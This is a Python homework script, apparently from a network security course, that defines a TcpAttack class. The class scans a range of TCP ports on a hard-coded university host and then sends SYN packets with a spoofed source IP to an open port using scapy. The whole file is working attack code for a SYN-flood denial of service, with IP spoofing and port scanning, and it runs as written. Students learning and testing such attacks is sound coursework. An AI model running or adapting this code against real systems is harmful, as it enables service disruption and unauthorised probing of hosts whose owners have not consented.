#!/usr/bin/env python

#############################
# Homework Number : 8
# Name: Dhruv Gowd
# ECN login: dgowd
# Due Date: 3/21/2019
#############################

import sys
import socket
import re
import os.path
from scapy.all import *

class TcpAttack:
    def __init__(self, spoof, target):
        self.spoofIp  = spoof
        self.targetIP = target

    def scanTarget(self, rangeStart, rangeEnd):
        file_out = open('openports.txt', 'w')

        #Going through each port in defined range
        for testport in range(rangeStart, rangeEnd + 1):
            #Recieves Socket data
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)

            #Tries to connect to each port, if open write to file_out
            #else try the next port
            try:
                sock.connect((self.targetIP, testport))
                file_out.write(str(testport) + '\n')
                #This is just so I know what port number is being tried in real time
                print str(testport) + ' OPEN'
            except:
                #This is just so I know what port number is being tried in real time
                print str(testport) + ' CLOSED'

        file_out.close()

    def attackTarget(self, port, numSyn):
        #First check if port is open, similar to the scan target method
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        isOpen = False
        #If open, flag is true, otherwise it is false
        try:
            sock.connect((self.targetIP, port))
            isOpen = True
        except:
            pass

        #Attack if open, else return 0
        SUCCESS = 1
        FAIL = 0
        if isOpen:
            for i in range(numSyn):
                #Greate a packet and send to target IP
                IP_header = IP(src=self.spoofIp, dst=self.targetIP)
                TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
                packet = IP_header / TCP_header
                try:
                    send(packet)
                except Exception as e:
                    print e
            return SUCCESS
        else:
            return FAIL


if __name__ == "__main__":
    spoofIP = '11.33.238.186'#Fake random IP
    targetIP = '128.46.4.83'#Testing with ECN machine
    rangeStart = 1
    rangeEnd = 45
    port = 80

    Tcp = TcpAttack(spoofIP, targetIP)
    Tcp.scanTarget(rangeStart, rangeEnd)

    if (Tcp.attackTarget(port, 5)):
        print 'port was able to be attacked'
    else:
        print 'port not able to be attacked'
